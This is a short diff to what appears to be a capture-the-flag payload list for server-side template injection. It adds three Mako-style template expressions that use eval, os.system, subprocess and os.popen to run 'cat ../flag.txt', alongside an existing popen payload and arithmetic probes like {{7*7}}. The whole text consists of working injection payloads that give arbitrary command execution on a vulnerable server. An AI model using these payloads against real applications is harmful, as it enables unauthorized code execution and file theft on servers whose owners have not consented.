@@ -1,3 +1,6 @@
+${eval("__import__('os').popen('cat ../flag.txt').read()")}
+${self.module.cache.util.os.system("cat ../flag.txt")}
+${self.module.cache.util.subprocess.getoutput("cat ../flag.txt")}
 ${self.module.cache.util.os.popen("cat ../flag.txt").read()}
 {{4*4}}[[5*5]]
 {{7*7}}
